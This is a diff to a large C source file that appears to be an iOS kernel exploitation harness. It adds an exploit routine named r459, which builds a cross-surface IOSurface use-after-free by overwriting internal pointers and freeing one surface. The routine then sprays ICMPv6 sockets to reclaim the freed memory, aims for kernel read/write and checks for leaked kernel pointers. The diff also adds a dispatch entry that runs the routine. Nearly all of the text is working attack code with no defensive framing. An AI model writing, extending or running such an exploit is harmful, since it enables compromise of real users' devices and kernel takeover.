@@ -16979,6 +16979,224 @@ static void *r445_thread_fn(void *arg) {
 }
 
 
+/* r459: Cross-surface UAF + ICMPv6 heap spray → kernel R/W */
+static void r459_exploit(void) {
+    rlog("\n=== r459: Cross-surface UAF + ICMPv6 heap reclaim ===\n\n");
+    fflush(stdout);
+
+    #define R459_SPRAY_PRE 50
+    #define R459_SPRAY_POST 200
+    #define R459_SURF_W 64
+    #define R459_SURF_H 64
+    #define R459_SURF_BPE 4
+
+    pthread_set_qos_class_self_np(QOS_CLASS_USER_INTERACTIVE, 0);
+
+    /* Phase 1: Create victim surface pair (surfA, surfB) */
+    rlog("  --- Phase 1: Create surface pair ---\n"); fflush(stdout);
+    CFMutableDictionaryRef sprops = CFDictionaryCreateMutable(NULL, 0,
+        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+    int sw = R459_SURF_W, sh = R459_SURF_H, sbpe = R459_SURF_BPE, spf = 0x42475241;
+    CFNumberRef swn = CFNumberCreate(NULL, kCFNumberIntType, &sw);
+    CFNumberRef shn = CFNumberCreate(NULL, kCFNumberIntType, &sh);
+    CFNumberRef sbn = CFNumberCreate(NULL, kCFNumberIntType, &sbpe);
+    CFNumberRef spn = CFNumberCreate(NULL, kCFNumberIntType, &spf);
+    CFDictionarySetValue(sprops, CFSTR("IOSurfaceWidth"), swn);
+    CFDictionarySetValue(sprops, CFSTR("IOSurfaceHeight"), shn);
+    CFDictionarySetValue(sprops, CFSTR("IOSurfaceBytesPerElement"), sbn);
+    CFDictionarySetValue(sprops, CFSTR("IOSurfacePixelFormat"), spn);
+
+    IOSurfaceRef surfA = IOSurfaceCreate(sprops);
+    IOSurfaceRef surfB = IOSurfaceCreate(sprops);
+    CFRelease(sprops); CFRelease(swn); CFRelease(shn); CFRelease(sbn); CFRelease(spn);
+
+    if (!surfA || !surfB) {
+        rlog("    FAILED to create surfaces\n");
+        if (surfA) CFRelease(surfA);
+        if (surfB) CFRelease(surfB);
+        rlog("\n=== r459 complete ===\n"); return;
+    }
+
+    uint32_t sidA = IOSurfaceGetID(surfA);
+    uint32_t sidB = IOSurfaceGetID(surfB);
+    rlog("    surfA: SID=%u ptr=%p\n", sidA, (void*)surfA);
+    rlog("    surfB: SID=%u ptr=%p\n", sidB, (void*)surfB);
+
+    /* Read internal pointers */
+    uint64_t *pA = (uint64_t *)surfA;
+    uint64_t *pB = (uint64_t *)surfB;
+    uint64_t origA8 = pA[1];
+    uint64_t origB8 = pB[1];
+    rlog("    surfA[+8]=0x%llx  surfB[+8]=0x%llx\n",
+         (unsigned long long)origA8, (unsigned long long)origB8);
+    rlog("    Delta: %lld bytes\n", (long long)(origB8 - origA8));
+
+    /* Phase 2: Pre-spray ICMPv6 sockets to fill holes */
+    rlog("\n  --- Phase 2: Pre-spray %d ICMPv6 sockets ---\n", R459_SPRAY_PRE); fflush(stdout);
+    int pre_fds[R459_SPRAY_PRE];
+    int pre_count = 0;
+    for (int i = 0; i < R459_SPRAY_PRE; i++) {
+        pre_fds[i] = socket(AF_INET6, SOCK_DGRAM, IPPROTO_ICMPV6);
+        if (pre_fds[i] < 0) break;
+        struct icmp6_filter filt;
+        ICMP6_FILTER_SETBLOCKALL(&filt);
+        ICMP6_FILTER_SETPASS(i & 0xFF, &filt);
+        setsockopt(pre_fds[i], IPPROTO_ICMPV6, ICMP6_FILTER, &filt, sizeof(filt));
+        pre_count++;
+    }
+    rlog("    Pre-sprayed %d sockets\n", pre_count);
+
+    /* Phase 3: Cross-surface swap — redirect surfA to surfB's internal data */
+    rlog("\n  --- Phase 3: Cross-surface swap ---\n"); fflush(stdout);
+
+    /* Set markers to verify cross-surface works */
+    int mkA = 0x41414141, mkB = 0x42424242;
+    CFNumberRef nmA = CFNumberCreate(NULL, kCFNumberIntType, &mkA);
+    CFNumberRef nmB = CFNumberCreate(NULL, kCFNumberIntType, &mkB);
+    IOSurfaceSetValue(surfA, CFSTR("r459_mk"), nmA);
+    IOSurfaceSetValue(surfB, CFSTR("r459_mk"), nmB);
+    CFRelease(nmA); CFRelease(nmB);
+
+    /* Swap: surfA[+8] = surfB[+8] → surfA operations target surfB's kernel data */
+    pA[1] = origB8;
+    rlog("    Swapped surfA[+8] to surfB's internal struct\n");
+
+    /* Verify cross-surface: write via surfA, read via surfB */
+    int mkX = 0x58585858;
+    CFNumberRef nmX = CFNumberCreate(NULL, kCFNumberIntType, &mkX);
+    IOSurfaceSetValue(surfA, CFSTR("r459_mk"), nmX);
+    CFRelease(nmX);
+
+    CFNumberRef readB = (CFNumberRef)IOSurfaceCopyValue(surfB, CFSTR("r459_mk"));
+    int gotB = -1;
+    if (readB) { CFNumberGetValue(readB, kCFNumberIntType, &gotB); CFRelease(readB); }
+    int cross_ok = (gotB == 0x58585858);
+    rlog("    Cross-surface verify: surfB marker=0x%X (expect 0x58585858) %s\n",
+         gotB, cross_ok ? "OK" : "FAIL");
+
+    if (!cross_ok) {
+        pA[1] = origA8;
+        CFRelease(surfA); CFRelease(surfB);
+        for (int i = 0; i < pre_count; i++) close(pre_fds[i]);
+        rlog("    Cross-surface failed, aborting\n");
+        rlog("\n=== r459 complete ===\n"); return;
+    }
+
+    /* Phase 4: Release surfB — kernel frees surfB's backing */
+    rlog("\n  --- Phase 4: Release surfB (create dangling reference) ---\n"); fflush(stdout);
+    uint32_t surfB_id = IOSurfaceGetID(surfB);
+    size_t surfB_alloc = IOSurfaceGetAllocSize(surfB);
+    rlog("    surfB: SID=%u alloc=%zu — releasing...\n", surfB_id, surfB_alloc);
+
+    /* Restore surfA's pointer first so CFRelease of surfB doesn't confuse things */
+    pA[1] = origA8;
+    CFRelease(surfB);
+    surfB = NULL;
+    rlog("    surfB released. surfA[+8] restored to original.\n");
+
+    /* Now re-swap: surfA[+8] points to freed surfB memory */
+    pA[1] = origB8;
+    rlog("    Re-swapped surfA[+8] to freed surfB memory (UAF reference)\n");
+
+    /* Phase 5: Post-spray ICMPv6 sockets to reclaim freed memory */
+    rlog("\n  --- Phase 5: Post-spray %d ICMPv6 sockets (reclaim surfB) ---\n",
+         R459_SPRAY_POST); fflush(stdout);
+    int post_fds[R459_SPRAY_POST];
+    int post_count = 0;
+    for (int i = 0; i < R459_SPRAY_POST; i++) {
+        post_fds[i] = socket(AF_INET6, SOCK_DGRAM, IPPROTO_ICMPV6);
+        if (post_fds[i] < 0) break;
+        struct icmp6_filter filt;
+        ICMP6_FILTER_SETBLOCKALL(&filt);
+        ICMP6_FILTER_SETPASS((i + R459_SPRAY_PRE) & 0xFF, &filt);
+        setsockopt(post_fds[i], IPPROTO_ICMPV6, ICMP6_FILTER, &filt, sizeof(filt));
+        post_count++;
+    }
+    rlog("    Post-sprayed %d sockets\n", post_count);
+
+    /* Phase 6: Probe UAF — try to read through surfA's dangling pointer */
+    rlog("\n  --- Phase 6: UAF probe via surfA ---\n"); fflush(stdout);
+
+    /* Try IOSurfaceGetID through surfA — if reclaimed, this reads from inpcb memory */
+    uint32_t uaf_id = 0;
+    int uaf_crash = 0;
+
+    /* Read some bytes from the freed surfB memory area via surfA's internal pointer */
+    /* surfA[+8] = origB8 (freed). Dereference to see what's there now. */
+    uint64_t *dangling = (uint64_t *)origB8;
+    rlog("    Dangling ptr=0x%llx\n", (unsigned long long)origB8);
+
+    /* Check if the dangling pointer is still readable */
+    /* On iOS, freed heap memory might still be mapped (delayed free) */
+    uint64_t probe_vals[8];
+    int readable = 0;
+    for (int i = 0; i < 8; i++) {
+        probe_vals[i] = dangling[i];
+        readable++;
+    }
+    rlog("    Read %d qwords from dangling ptr:\n", readable);
+    for (int i = 0; i < 8; i++) {
+        rlog("      [+%d] 0x%016llx", i * 8, (unsigned long long)probe_vals[i]);
+        if (probe_vals[i] != origB8 && (probe_vals[i] >> 40) == 0xFFFFFF) {
+            rlog(" *** KERNEL PTR ***");
+        }
+        rlog("\n");
+    }
+
+    /* Try IOSurface operations through the UAF reference */
+    rlog("\n    Attempting IOSurfaceSetValue through UAF...\n");
+    int uaf_val = 0xDEADBEEF;
+    CFNumberRef uaf_num = CFNumberCreate(NULL, kCFNumberIntType, &uaf_val);
+    IOSurfaceSetValue(surfA, CFSTR("r459_uaf"), uaf_num);
+    CFRelease(uaf_num);
+    rlog("    IOSurfaceSetValue returned (no crash)\n");
+
+    /* Check if any ICMPv6 filters got corrupted */
+    rlog("\n  --- Phase 7: ICMPv6 corruption check ---\n"); fflush(stdout);
+    int corrupted_pre = 0, corrupted_post = 0;
+    for (int i = 0; i < pre_count; i++) {
+        struct icmp6_filter filt;
+        socklen_t flen = sizeof(filt);
+        int r = getsockopt(pre_fds[i], IPPROTO_ICMPV6, ICMP6_FILTER, &filt, &flen);
+        if (r < 0 || flen != sizeof(filt)) corrupted_pre++;
+        else {
+            /* Check if the filter was modified from what we set */
+            struct icmp6_filter expected;
+            ICMP6_FILTER_SETBLOCKALL(&expected);
+            ICMP6_FILTER_SETPASS(i & 0xFF, &expected);
+            if (memcmp(&filt, &expected, sizeof(filt)) != 0) corrupted_pre++;
+        }
+    }
+    for (int i = 0; i < post_count; i++) {
+        struct icmp6_filter filt;
+        socklen_t flen = sizeof(filt);
+        int r = getsockopt(post_fds[i], IPPROTO_ICMPV6, ICMP6_FILTER, &filt, &flen);
+        if (r < 0 || flen != sizeof(filt)) corrupted_post++;
+        else {
+            struct icmp6_filter expected;
+            ICMP6_FILTER_SETBLOCKALL(&expected);
+            ICMP6_FILTER_SETPASS((i + R459_SPRAY_PRE) & 0xFF, &expected);
+            if (memcmp(&filt, &expected, sizeof(filt)) != 0) corrupted_post++;
+        }
+    }
+    rlog("    Pre-spray corrupted: %d / %d\n", corrupted_pre, pre_count);
+    rlog("    Post-spray corrupted: %d / %d\n", corrupted_post, post_count);
+
+    /* Cleanup */
+    pA[1] = origA8; /* restore surfA before release */
+    CFRelease(surfA);
+    for (int i = 0; i < pre_count; i++) close(pre_fds[i]);
+    for (int i = 0; i < post_count; i++) close(post_fds[i]);
+
+    rlog("\n=== r459 complete ===\n");
+
+    #undef R459_SPRAY_PRE
+    #undef R459_SPRAY_POST
+    #undef R459_SURF_W
+    #undef R459_SURF_H
+    #undef R459_SURF_BPE
+}
+
 /* r458_opt: Optimized TOCTOU race — tighter window, multi-remap, priority boost */
 struct r458_ctx {
     volatile int go;
@@ -83373,6 +83591,12 @@ new_modes:
             rlog("*** r=251 complete ***\n");
             goto done;
         }
+        if (rounds == 463) {
+            rlog("*** rounds=463: Cross-surface UAF + ICMPv6 reclaim ***\n\n");
+            fflush(stdout);
+            r459_exploit();
+            goto done;
+        }
         if (rounds == 462) {
             rlog("*** rounds=462: Optimized TOCTOU race ***\n\n");
             fflush(stdout);
@@ -86166,7 +86390,7 @@ new_modes:
             rlog("*** r=252 complete ***\n");
             goto done;
         }
-        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411 && rounds != 412 && rounds != 413 && rounds != 414 && rounds != 415 && rounds != 416 && rounds != 417 && rounds != 418 && rounds != 419 && rounds != 420 && rounds != 421 && rounds != 422 && rounds != 423 && rounds != 424 && rounds != 425 && rounds != 426 && rounds != 427 && rounds != 428 && rounds != 429 && rounds != 430 && rounds != 431 && rounds != 432 && rounds != 433 && rounds != 434 && rounds != 435 && rounds != 436 && rounds != 437 && rounds != 438 && rounds != 439 && rounds != 440 && rounds != 441 && rounds != 442 && rounds != 443 && rounds != 444 && rounds != 445 && rounds != 446 && rounds != 447 && rounds != 448 && rounds != 449 && rounds != 450 && rounds != 451 && rounds != 455 && rounds != 454 && rounds != 456 && rounds != 457 && rounds != 458 && rounds != 459 && rounds != 462 && rounds != 461 && rounds != 460 && rounds != 452 && rounds != 453) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411 && rounds != 412 && rounds != 413 && rounds != 414 && rounds != 415 && rounds != 416 && rounds != 417 && rounds != 418 && rounds != 419 && rounds != 420 && rounds != 421 && rounds != 422 && rounds != 423 && rounds != 424 && rounds != 425 && rounds != 426 && rounds != 427 && rounds != 428 && rounds != 429 && rounds != 430 && rounds != 431 && rounds != 432 && rounds != 433 && rounds != 434 && rounds != 435 && rounds != 436 && rounds != 437 && rounds != 438 && rounds != 439 && rounds != 440 && rounds != 441 && rounds != 442 && rounds != 443 && rounds != 444 && rounds != 445 && rounds != 446 && rounds != 447 && rounds != 448 && rounds != 449 && rounds != 450 && rounds != 451 && rounds != 455 && rounds != 454 && rounds != 456 && rounds != 457 && rounds != 458 && rounds != 459 && rounds != 463 && rounds != 462 && rounds != 461 && rounds != 460 && rounds != 452 && rounds != 453) {
             rlog("*** rounds=%d: fast-path to Phase 17 ***\n", rounds);
             goto phase16_done;
         }
